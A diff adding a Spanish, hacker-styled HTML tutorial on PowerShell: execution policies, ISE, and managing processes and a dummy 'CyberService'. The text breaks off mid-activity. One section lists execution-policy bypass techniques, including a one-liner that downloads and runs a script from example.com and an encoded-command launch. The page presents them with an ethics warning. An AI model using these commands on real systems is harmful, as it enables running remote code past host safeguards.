@@ -1,0 +1,1434 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía Hacker de PowerShell: Módulo de Operaciones</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Fira Code', monospace;
+            background-color: #0d0221;
+            color: #00f0ff;
+            text-shadow: 0 0 5px #00f0ff, 0 0 10px #00f0ff;
+        }
+        .container {
+            max-width: 1200px;
+            margin: auto;
+            padding: 2rem;
+        }
+        .header-glitch {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #f0f;
+            text-shadow: 0 0 5px #f0f, 0 0 10px #f0f, 0 0 15px #f0f,
+                         -2px 2px 2px #00f0ff, 2px -2px 2px #ff0;
+            animation: glitch 1.5s infinite;
+        }
+        .section-title {
+            font-size: 2rem;
+            font-weight: 500;
+            color: #50fa7b;
+            text-shadow: 0 0 5px #50fa7b;
+            border-bottom: 2px solid #50fa7b;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .card {
+            background-color: rgba(16, 1, 41, 0.8);
+            border: 1px solid #ff00ff;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.4);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.6);
+        }
+        code {
+            background-color: #282a36;
+            color: #f8f8f2;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        pre {
+            background-color: #282a36;
+            color: #f8f8f2;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #ff79c6;
+            overflow-x: auto;
+            text-shadow: none;
+        }
+        .comment {
+            color: #6272a4;
+        }
+        .command {
+            color: #8be9fd;
+        }
+        .parameter {
+            color: #ffb86c;
+        }
+        .string {
+            color: #f1fa8c;
+        }
+        .keyword {
+             color: #ff79c6;
+        }
+        .practical-activity {
+            border: 2px dashed #f1fa8c;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            border-radius: 8px;
+            background-color: rgba(40, 42, 54, 0.5);
+        }
+        .activity-title {
+            font-size: 1.5rem;
+            color: #f1fa8c;
+            text-shadow: 0 0 5px #f1fa8c;
+        }
+        button {
+            background-color: #bd93f9;
+            color: #282a36;
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-shadow: none;
+        }
+        button:hover {
+            background-color: #ff79c6;
+        }
+        .quiz-option {
+            background-color: rgba(40, 42, 54, 0.8);
+            border: 2px solid #6272a4;
+            border-radius: 8px;
+            padding: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: #f8f8f2;
+        }
+        .quiz-option:hover {
+            border-color: #bd93f9;
+            background-color: rgba(189, 147, 249, 0.1);
+        }
+        .quiz-option.selected {
+            border-color: #50fa7b;
+            background-color: rgba(80, 250, 123, 0.2);
+        }
+        .quiz-option.correct {
+            border-color: #50fa7b;
+            background-color: rgba(80, 250, 123, 0.3);
+        }
+        .quiz-option.incorrect {
+            border-color: #ff5555;
+            background-color: rgba(255, 85, 85, 0.3);
+        }
+        .quiz-feedback {
+            background-color: rgba(40, 42, 54, 0.9);
+            border-left: 4px solid #50fa7b;
+            padding: 1rem;
+            margin-top: 1rem;
+            border-radius: 4px;
+        }
+        .variable {
+            color: #8be9fd;
+        }
+        .property {
+            color: #ffb86c;
+        }
+        .operator {
+            color: #ff79c6;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Encabezado -->
+        <header class="text-center my-12">
+            <h1 class="header-glitch">INICIANDO PROTOCOLO CFT-HACK</h1>
+            <p class="text-xl mt-4">Guía de Operaciones Tácticas con PowerShell</p>
+        </header>
+
+        <!-- Sección 1: Configuración del Laboratorio -->
+        <section id="lab-setup" class="mb-12">
+            <h2 class="section-title">> Sección 1: Configuración del Laboratorio [ACCESO REQUERIDO]</h2>
+            <div class="card">
+                <p>Todo operador necesita un campo de entrenamiento. Nuestro laboratorio será nuestra base de operaciones. El primer paso es asegurar que tenemos los privilegios necesarios.</p>
+                <p class="mt-4"><strong>Acción Requerida:</strong> Inicia una terminal de PowerShell con privilegios de Administrador. (Clic derecho en PowerShell -> "Ejecutar como administrador").</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-4 text-pink-500">Creación de Servicio de Prueba: "CyberService"</h3>
+                <p>Para nuestras prácticas, crearemos un servicio falso. Esto nos permite experimentar sin riesgo de desestabilizar el sistema operativo anfitrión. Este servicio, llamado <code>CyberService</code>, simulará ser un agente persistente en el sistema.</p>
+                <p class="mt-2">Copia y ejecuta el siguiente bloque de código en tu terminal de PowerShell administrativa para crear el servicio. Explicaremos cada parte más adelante.</p>
+
+                <pre class="mt-4"><span class="comment"># Comando para crear un nuevo servicio.</span>
+<span class="comment"># -Name: El nombre corto del servicio.</span>
+<span class="comment"># -BinaryPathName: El ejecutable que correrá el servicio. Usaremos ping para simular actividad.</span>
+<span class="comment"># -DisplayName: El nombre que verás en la lista de servicios.</span>
+<span class="comment"># -Description: Una breve descripción de nuestro agente.</span>
+<span class="comment"># -StartupType: 'Manual' significa que debemos iniciarlo nosotros.</span>
+<span class="command">New-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-BinaryPathName</span> <span class="string">'C:\Windows\System32\ping.exe -t 127.0.0.1'</span> <span class="parameter">-DisplayName</span> <span class="string">"CyberTest Service Agent"</span> <span class="parameter">-Description</span> <span class="string">"Agente de prueba para operaciones de PowerShell."</span> <span class="parameter">-StartupType</span> <span class="string">Manual</span></pre>
+                
+                <p class="mt-4">Si el comando se ejecuta sin errores, ¡felicidades! Has implantado tu primer "agente" en el sistema. Si recibes un error de "Acceso Denegado", asegúrate de estar en una consola de administrador.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-4 text-pink-500">PowerShell ISE: Tu Centro de Comando Avanzado</h3>
+                <p>Mientras que la línea de comandos es poderosa, PowerShell ISE (Integrated Scripting Environment) es tu laboratorio completo para desarrollar operaciones complejas. Es como la diferencia entre usar un cuchillo y tener todo un arsenal a tu disposición.</p>
+                
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Iniciando PowerShell ISE</h4>
+                <p>Existen varias formas de acceder a tu centro de comando:</p>
+                <pre class="mt-2"><span class="comment"># Método 1: Desde el menú inicio</span>
+<span class="string">Buscar: "PowerShell ISE" → Ejecutar como administrador</span>
+
+<span class="comment"># Método 2: Desde PowerShell normal</span>
+<span class="command">ise</span>
+
+<span class="comment"># Método 3: Desde Ejecutar (Win + R)</span>
+<span class="string">powershell_ise.exe</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Anatomía del Centro de Control</h4>
+                <p>PowerShell ISE está dividido en sectores estratégicos:</p>
+                <div class="mt-3 p-4 bg-gray-800 bg-opacity-50 border border-purple-500 rounded-lg">
+                    <ul class="list-disc list-inside text-gray-300 space-y-2">
+                        <li><strong class="text-green-400">Script Pane (Panel Superior):</strong> Donde escribes y editas tus scripts. Con resaltado de sintaxis y numeración de líneas.</li>
+                        <li><strong class="text-blue-400">Console Pane (Panel Inferior):</strong> Terminal interactivo para pruebas rápidas y ejecución de comandos.</li>
+                        <li><strong class="text-yellow-400">Commands Pane (Panel Lateral):</strong> Explorador de cmdlets con filtros y ayuda integrada.</li>
+                        <li><strong class="text-purple-400">Variables Pane:</strong> Monitoreo en tiempo real de variables y su contenido.</li>
+                    </ul>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Operaciones Básicas del ISE</h4>
+                <pre class="mt-2"><span class="comment"># Crear un nuevo script</span>
+<span class="string">Ctrl + N</span> <span class="comment"># O File → New</span>
+
+<span class="comment"># Guardar tu arsenal de códigos</span>
+<span class="string">Ctrl + S</span> <span class="comment"># Guardar como .ps1</span>
+
+<span class="comment"># Ejecutar script completo</span>
+<span class="string">F5</span> <span class="comment"># O botón "Run Script"</span>
+
+<span class="comment"># Ejecutar solo líneas seleccionadas</span>
+<span class="string">F8</span> <span class="comment"># Perfecto para debugging</span>
+
+<span class="comment"># Detener ejecución (cuando algo sale mal)</span>
+<span class="string">Ctrl + Break</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Script de Prueba: "Recon Script"</h4>
+                <p>Vamos a crear tu primer script de reconocimiento del sistema. Copia este código en el Script Pane del ISE:</p>
+                <pre class="mt-2"><span class="comment"># === SCRIPT DE RECONOCIMIENTO CFT-HACK ===</span>
+<span class="comment"># Nombre: SystemRecon.ps1</span>
+<span class="comment"># Propósito: Recopilación básica de información del sistema</span>
+
+<span class="command">Write-Host</span> <span class="string">"🔍 INICIANDO RECONOCIMIENTO DEL SISTEMA..."</span> <span class="parameter">-ForegroundColor</span> <span class="string">Cyan</span>
+<span class="command">Write-Host</span> <span class="string">"="</span> * 50 <span class="parameter">-ForegroundColor</span> <span class="string">Green</span>
+
+<span class="comment"># Información básica del sistema</span>
+<span class="variable">$sistema</span> = <span class="command">Get-ComputerInfo</span>
+<span class="command">Write-Host</span> <span class="string">"💻 Sistema: $($sistema.WindowsProductName)"</span>
+<span class="command">Write-Host</span> <span class="string">"🖥️  Arquitectura: $($sistema.OsArchitecture)"</span>
+<span class="command">Write-Host</span> <span class="string">"⚡ RAM Total: $([math]::Round($sistema.TotalPhysicalMemory/1GB, 2)) GB"</span>
+
+<span class="comment"># Verificar nuestro servicio de prueba</span>
+<span class="variable">$cyberService</span> = <span class="command">Get-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-ErrorAction</span> <span class="string">SilentlyContinue</span>
+<span class="keyword">if</span> (<span class="variable">$cyberService</span>) {
+    <span class="command">Write-Host</span> <span class="string">"🚀 CyberService detectado: $($cyberService.Status)"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Yellow</span>
+} <span class="keyword">else</span> {
+    <span class="command">Write-Host</span> <span class="string">"⚠️  CyberService no encontrado"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Red</span>
+}
+
+<span class="command">Write-Host</span> <span class="string">"✅ Reconocimiento completado"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Green</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Ventajas Operacionales del ISE</h4>
+                <div class="mt-3 p-4 bg-blue-900 bg-opacity-30 border-l-4 border-blue-500 rounded">
+                    <ul class="list-disc list-inside text-blue-300 space-y-1 text-sm">
+                        <li><strong>IntelliSense:</strong> Autocompletado inteligente de cmdlets y parámetros</li>
+                        <li><strong>Syntax Highlighting:</strong> Colores que identifican errores antes de ejecutar</li>
+                        <li><strong>Debugging Visual:</strong> Puntos de interrupción y ejecución paso a paso</li>
+                        <li><strong>Multi-tab:</strong> Múltiples scripts abiertos simultáneamente</li>
+                        <li><strong>Integrated Help:</strong> Documentación instantánea de comandos</li>
+                        <li><strong>Snippet Library:</strong> Plantillas de código predefinidas</li>
+                    </ul>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">ISE vs Línea de Comandos: ¿Cuándo usar cada uno?</h4>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
+                    <div class="p-3 bg-green-900 bg-opacity-30 border border-green-500 rounded">
+                        <h5 class="font-bold text-green-400 mb-2">🎯 Usa ISE para:</h5>
+                        <ul class="text-green-300 text-sm space-y-1">
+                            <li>• Desarrollar scripts complejos</li>
+                            <li>• Debugging y testing</li>
+                            <li>• Aprender nuevos cmdlets</li>
+                            <li>• Proyectos de automatización</li>
+                        </ul>
+                    </div>
+                    <div class="p-3 bg-orange-900 bg-opacity-30 border border-orange-500 rounded">
+                        <h5 class="font-bold text-orange-400 mb-2">⚡ Usa Terminal para:</h5>
+                        <ul class="text-orange-300 text-sm space-y-1">
+                            <li>• Comandos rápidos</li>
+                            <li>• Operaciones de una línea</li>
+                            <li>• Administración remota</li>
+                            <li>• Scripts en producción</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="text-xl font-bold mt-6 mb-4 text-pink-500">Políticas de Ejecución: Las Reglas del Juego</h3>
+                <p>Antes de lanzar scripts al ciberespacio, necesitas entender las <strong>Execution Policies</strong>. Son el sistema de seguridad que determina qué scripts pueden ejecutarse en tu máquina. Es como el protocolo de autorización para operaciones sensibles.</p>
+                
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">¿Qué son las Políticas de Ejecución?</h4>
+                <p>Las políticas de ejecución son una función de seguridad de PowerShell que controla las condiciones bajo las cuales PowerShell carga archivos de configuración y ejecuta scripts. No son un límite de seguridad real, sino una salvaguarda básica para prevenir la ejecución accidental de scripts maliciosos.</p>
+                
+                <div class="mt-4 p-4 bg-yellow-900 bg-opacity-30 border-l-4 border-yellow-500 rounded">
+                    <h5 class="font-bold text-yellow-400 mb-2">⚠️ CONCEPTO CLAVE</h5>
+                    <p class="text-yellow-300 text-sm">
+                        Las políticas de ejecución NO son una medida de seguridad real. Un atacante determinado puede evadirlas fácilmente. 
+                        Su propósito es prevenir errores de usuarios legítimos, no detener atacantes sofisticados.
+                    </p>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-6 mb-2 text-cyan-400">Los Cinco Niveles de Seguridad</h4>
+                <div class="grid grid-cols-1 gap-4 mt-4">
+                    <div class="p-4 bg-red-900 bg-opacity-30 border border-red-500 rounded">
+                        <h5 class="font-bold text-red-400 mb-2">🔒 RESTRICTED (Más Restrictiva)</h5>
+                        <p class="text-red-300 text-sm mb-2">Configuración por defecto en Windows client. No ejecuta scripts, solo cmdlets y funciones interactivas.</p>
+                        <code class="text-xs text-red-200">Ideal para: Usuarios finales sin necesidades de scripting</code>
+                    </div>
+                    
+                    <div class="p-4 bg-orange-900 bg-opacity-30 border border-orange-500 rounded">
+                        <h5 class="font-bold text-orange-400 mb-2">✍️ ALLSIGNED</h5>
+                        <p class="text-orange-300 text-sm mb-2">Ejecuta scripts solo si están firmados digitalmente por un editor de confianza. Incluye scripts locales.</p>
+                        <code class="text-xs text-orange-200">Ideal para: Entornos corporativos con infraestructura PKI</code>
+                    </div>
+                    
+                    <div class="p-4 bg-blue-900 bg-opacity-30 border border-blue-500 rounded">
+                        <h5 class="font-bold text-blue-400 mb-2">🌐 REMOTESIGNED (Recomendada)</h5>
+                        <p class="text-blue-300 text-sm mb-2">Scripts locales se ejecutan sin firma. Scripts descargados de Internet requieren firma digital.</p>
+                        <code class="text-xs text-blue-200">Ideal para: Desarrolladores y administradores</code>
+                    </div>
+                    
+                    <div class="p-4 bg-green-900 bg-opacity-30 border border-green-500 rounded">
+                        <h5 class="font-bold text-green-400 mb-2">🚫 UNRESTRICTED</h5>
+                        <p class="text-green-300 text-sm mb-2">Ejecuta cualquier script, pero advierte sobre scripts descargados de Internet.</p>
+                        <code class="text-xs text-green-200">Ideal para: Laboratorios de prueba y desarrollo</code>
+                    </div>
+                    
+                    <div class="p-4 bg-purple-900 bg-opacity-30 border border-purple-500 rounded">
+                        <h5 class="font-bold text-purple-400 mb-2">⚡ BYPASS (Sin Restricciones)</h5>
+                        <p class="text-purple-300 text-sm mb-2">No bloquea nada ni muestra advertencias. Equivale a no tener política de ejecución.</p>
+                        <code class="text-xs text-purple-200">Ideal para: Scripts embebidos en aplicaciones</code>
+                    </div>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-6 mb-2 text-cyan-400">Comandos de Gestión</h4>
+                <pre class="mt-2"><span class="comment"># Verificar la política actual</span>
+<span class="command">Get-ExecutionPolicy</span>
+
+<span class="comment"># Ver todas las políticas por scope</span>
+<span class="command">Get-ExecutionPolicy</span> <span class="parameter">-List</span>
+
+<span class="comment"># Cambiar política para el usuario actual (más seguro)</span>
+<span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">RemoteSigned</span> <span class="parameter">-Scope</span> <span class="string">CurrentUser</span>
+
+<span class="comment"># Cambiar política para toda la máquina (requiere admin)</span>
+<span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">RemoteSigned</span> <span class="parameter">-Scope</span> <span class="string">LocalMachine</span>
+
+<span class="comment"># Cambio temporal solo para esta sesión</span>
+<span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">Bypass</span> <span class="parameter">-Scope</span> <span class="string">Process</span></pre>
+
+                <h4 class="text-lg font-semibold mt-6 mb-2 text-cyan-400">Scopes: Jerarquía de Autoridad</h4>
+                <p>Las políticas se pueden aplicar en diferentes niveles, con un orden de precedencia específico:</p>
+                <div class="mt-3 p-4 bg-gray-800 bg-opacity-50 border border-gray-500 rounded-lg">
+                    <ol class="list-decimal list-inside text-gray-300 space-y-2 text-sm">
+                        <li><strong class="text-red-400">Group Policy (MachinePolicy/UserPolicy):</strong> Configurado por administradores de dominio. Máxima prioridad.</li>
+                        <li><strong class="text-orange-400">Process:</strong> Afecta solo la sesión actual de PowerShell.</li>
+                        <li><strong class="text-blue-400">CurrentUser:</strong> Afecta solo al usuario actual.</li>
+                        <li><strong class="text-green-400">LocalMachine:</strong> Afecta todos los usuarios de la máquina.</li>
+                    </ol>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-6 mb-2 text-cyan-400">Técnicas de Bypass (Para Hacking Ético)</h4>
+                <p>Un hacker ético debe conocer las técnicas que usan los atacantes. Estas son algunas formas de evadir las políticas:</p>
+                <pre class="mt-2"><span class="comment"># Método 1: Usar -ExecutionPolicy en la línea de comandos</span>
+<span class="command">powershell.exe</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">Bypass</span> <span class="parameter">-File</span> <span class="string">script.ps1</span>
+
+<span class="comment"># Método 2: Leer el script y ejecutarlo</span>
+<span class="command">Get-Content</span> <span class="string">script.ps1</span> | <span class="command">Invoke-Expression</span>
+
+<span class="comment"># Método 3: Descargar y ejecutar desde Internet</span>
+<span class="command">IEX</span> (<span class="command">New-Object</span> <span class="string">Net.WebClient</span>).DownloadString('<span class="string">http://example.com/script.ps1</span>')
+
+<span class="comment"># Método 4: Encoded command</span>
+<span class="command">powershell.exe</span> <span class="parameter">-EncodedCommand</span> <span class="string">[Base64EncodedScript]</span></pre>
+
+                <div class="mt-4 p-4 bg-red-900 bg-opacity-30 border-l-4 border-red-500 rounded">
+                    <h5 class="font-bold text-red-400 mb-2">🛡️ ADVERTENCIA DE SEGURIDAD</h5>
+                    <p class="text-red-300 text-sm">
+                        Estas técnicas se muestran con fines educativos para que entiendas las limitaciones de las políticas de ejecución. 
+                        NUNCA las uses para evadir medidas de seguridad en sistemas que no poseas. La ignorancia no es una defensa legal.
+                    </p>
+                </div>
+
+                <h4 class="text-lg font-semibold mt-6 mb-2 text-cyan-400">Configuración Recomendada para el Laboratorio</h4>
+                <p>Para nuestro laboratorio de aprendizaje, configuraremos <code>RemoteSigned</code> que nos permite ejecutar scripts locales pero mantiene cierta protección:</p>
+                <pre class="mt-2"><span class="comment"># Configuración recomendada para este curso</span>
+<span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">RemoteSigned</span> <span class="parameter">-Scope</span> <span class="string">CurrentUser</span> <span class="parameter">-Force</span>
+
+<span class="comment"># Verificar que se aplicó correctamente</span>
+<span class="command">Get-ExecutionPolicy</span> <span class="parameter">-Scope</span> <span class="string">CurrentUser</span></pre>
+
+                <div class="mt-4 p-4 bg-green-900 bg-opacity-30 border-l-4 border-green-500 rounded">
+                    <h5 class="font-bold text-green-400 mb-2">💡 BEST PRACTICE</h5>
+                    <p class="text-green-300 text-sm">
+                        Usa siempre <code>-Scope CurrentUser</code> en lugar de <code>LocalMachine</code> cuando sea posible. 
+                        Esto evita afectar otros usuarios del sistema y no requiere privilegios de administrador.
+                    </p>
+                </div>
+
+                <div class="practical-activity mt-6">
+                    <h4 class="activity-title">>> Actividad Práctica #1A: Configuración de Políticas de Ejecución</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Abre PowerShell (no necesariamente como admin para esta actividad).</li>
+                        <li>Ejecuta <code>Get-ExecutionPolicy -List</code> para ver todas las políticas actuales.</li>
+                        <li>Cambia la política del usuario actual a RemoteSigned:
+                        <pre class="mt-2"><span class="command">Set-ExecutionPolicy</span> <span class="parameter">-ExecutionPolicy</span> <span class="string">RemoteSigned</span> <span class="parameter">-Scope</span> <span class="string">CurrentUser</span></pre>
+                        </li>
+                        <li>Verifica el cambio con <code>Get-ExecutionPolicy</code>.</li>
+                        <li>Crea un script de prueba en el Bloc de Notas:
+                        <pre class="mt-2"><span class="comment"># test-policy.ps1</span>
+<span class="command">Write-Host</span> <span class="string">"¡Script ejecutado exitosamente!"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Green</span>
+<span class="command">Get-ExecutionPolicy</span></pre>
+                        </li>
+                        <li>Guarda el archivo como <code>C:\Temp\test-policy.ps1</code>.</li>
+                        <li>Ejecuta el script desde PowerShell:
+                        <pre class="mt-2"><span class="string">C:\Temp\test-policy.ps1</span></pre>
+                        </li>
+                        <li><strong>Experimento:</strong> Cambia temporalmente la política a Restricted y vuelve a intentar ejecutar el script. ¿Qué ocurre?</li>
+                        <li>Restaura la política a RemoteSigned para continuar con el curso.</li>
+                    </ol>
+                </div>
+
+                <div class="practical-activity mt-6">
+                    <h4 class="activity-title">>> Actividad Práctica #1B: Dominando el ISE</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Abre PowerShell ISE como administrador.</li>
+                        <li>Crea el script "SystemRecon.ps1" con el código proporcionado arriba.</li>
+                        <li>Guárdalo en <code>C:\Temp\SystemRecon.ps1</code>.</li>
+                        <li>Ejecuta el script completo con F5. ¿Qué información muestra?</li>
+                        <li>Practica ejecutar solo las líneas del sistema operativo (selecciona las líneas y presiona F8).</li>
+                        <li>En el Console Pane, ejecuta <code>Get-Command *Service*</code> para ver todos los cmdlets relacionados con servicios.</li>
+                        <li>Usa el Commands Pane para explorar la categoría "Management" y encontrar cmdlets útiles para administración.</li>
+                        <li><strong>Desafío:</strong> Modifica el script para que también muestre la cantidad de procesos en ejecución usando <code>Get-Process</code>.</li>
+                    </ol>
+                    <div class="mt-4 p-3 bg-purple-900 bg-opacity-30 border-l-4 border-purple-500 rounded">
+                        <p class="text-purple-300 text-sm">
+                            <strong>💡 Tip del Hacker:</strong> En el ISE, usa Ctrl+J para acceder a los snippets. 
+                            Contienen plantillas predefinidas para estructuras comunes como bucles, funciones y manejo de errores.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 2: Gestión de Procesos -->
+        <section id="process-management" class="mb-12">
+            <h2 class="section-title">> Sección 2: Gestión de Procesos - Controlando el Flujo</h2>
+            <div class="card">
+                <p>Los procesos son los programas en ejecución. Saber listarlos, filtrarlos y terminarlos es fundamental. Es como ver las entidades que se mueven dentro de la Matrix.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Get-Process</h3>
+                <p>Lista todos los procesos activos en el sistema.</p>
+                <pre class="mt-2"><span class="comment"># Listar todos los procesos</span>
+<span class="command">Get-Process</span>
+
+<span class="comment"># Buscar un proceso por su nombre (ej. notepad)</span>
+<span class="command">Get-Process</span> <span class="parameter">-Name</span> <span class="string">"notepad"</span>
+
+<span class="comment"># Usar wildcards (*) para buscar procesos que empiecen con "exp"</span>
+<span class="command">Get-Process</span> <span class="parameter">-Name</span> <span class="string">"exp*"</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Stop-Process</h3>
+                <p>Termina uno o más procesos. ¡Usa este poder con cuidado! Terminar un proceso crítico puede causar inestabilidad.</p>
+                <pre class="mt-2"><span class="comment"># Terminar un proceso por su nombre</span>
+<span class="command">Stop-Process</span> <span class="parameter">-Name</span> <span class="string">"notepad"</span>
+
+<span class="comment"># Terminar un proceso por su ID (el ID se obtiene con Get-Process)</span>
+<span class="command">Stop-Process</span> <span class="parameter">-Id</span> <span class="string">1234</span></pre>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Start-Process</h3>
+                <p>Inicia un nuevo proceso.</p>
+                <pre class="mt-2"><span class="comment"># Iniciar la calculadora</span>
+<span class="command">Start-Process</span> <span class="string">"calc"</span></pre>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #1: Caza de Procesos</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Abre 3 ventanas del Bloc de Notas (notepad.exe).</li>
+                        <li>En PowerShell, ejecuta <code>Get-Process -Name "notepad"</code> para ver las 3 instancias. Anota sus propiedades, como el ID y el uso de memoria (WS).</li>
+                        <li>Inicia el administrador de tareas de Windows con PowerShell: <code>Start-Process "taskmgr"</code>.</li>
+                        <li>Ahora, el gran final: usa el "pipeline" (|) para terminar todos los Blocs de Notas a la vez. El pipeline envía el resultado de un comando al siguiente.
+                        <pre class="mt-2"><span class="command">Get-Process</span> <span class="parameter">-Name</span> <span class="string">"notepad"</span> | <span class="command">Stop-Process</span></pre>
+                        </li>
+                        <li>Verifica que todas las ventanas del Bloc de Notas se han cerrado.</li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 3: Gestión de Servicios -->
+        <section id="service-management" class="mb-12">
+            <h2 class="section-title">> Sección 3: Gestión de Servicios - Los Hilos del Sistema</h2>
+            <div class="card">
+                <p>Los servicios son programas que se ejecutan en segundo plano, el corazón latente del sistema. Controlarlos es clave para la persistencia y la administración.</p>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Get-Service</h3>
+                <p>Lista los servicios del sistema.</p>
+                <pre class="mt-2"><span class="comment"># Listar todos los servicios</span>
+<span class="command">Get-Service</span>
+
+<span class="comment"># Buscar nuestro servicio de prueba</span>
+<span class="command">Get-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span>
+
+<span class="comment"># Mostrar todos los servicios que están detenidos</span>
+<span class="command">Get-Service</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">Status</span> <span class="operator">-eq</span> <span class="string">'Stopped'</span> }</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlets: Start/Stop/Restart-Service</h3>
+                <p>Controlan el estado de un servicio.</p>
+                <pre class="mt-2"><span class="comment"># Iniciar nuestro CyberService</span>
+<span class="command">Start-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span>
+
+<span class="comment"># Detenerlo</span>
+<span class="command">Stop-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span>
+
+<span class="comment"># Reiniciarlo</span>
+<span class="command">Restart-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Set-Service</h3>
+                <p>Modifica las propiedades de un servicio, como su tipo de inicio.</p>
+                <pre class="mt-2"><span class="comment"># Cambiar el servicio para que inicie automáticamente con el sistema</span>
+<span class="command">Set-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-StartupType</span> <span class="string">Automatic</span>
+
+<span class="comment"># Deshabilitar el servicio para que no pueda ser iniciado</span>
+<span class="command">Set-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-StartupType</span> <span class="string">Disabled</span></pre>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #2: Control del Agente</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Verifica el estado de tu <code>CyberService</code>. ¿Está corriendo?
+                        <pre class="mt-2"><span class="command">Get-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span></pre>
+                        </li>
+                        <li>Inícialo con <code>Start-Service</code> y vuelve a verificar su estado. Ahora debería decir "Running".</li>
+                        <li>Detén el servicio con <code>Stop-Service</code>. Verifica de nuevo.</li>
+                        <li>Configura el servicio para que se inicie automáticamente cuando el sistema arranque.
+                        <pre class="mt-2"><span class="command">Set-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-StartupType</span> <span class="string">Automatic</span></pre>
+                        </li>
+                        <li>Verifica el cambio con <code>Get-Service -Name "CyberService" | Format-List Name, StartupType</code>.</li>
+                        <li>¡Importante! Al finalizar la clase, "limpia la escena". Deshabilita y elimina el servicio.
+                        <pre class="mt-2"><span class="comment"># Primero deshabilítalo y detenlo si está corriendo</span>
+<span class="command">Set-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-StartupType</span> <span class="string">Disabled</span>
+<span class="command">Stop-Service</span> <span class="parameter">-Name</span> <span class="string">"CyberService"</span> <span class="parameter">-ErrorAction</span> <span class="string">SilentlyContinue</span>
+
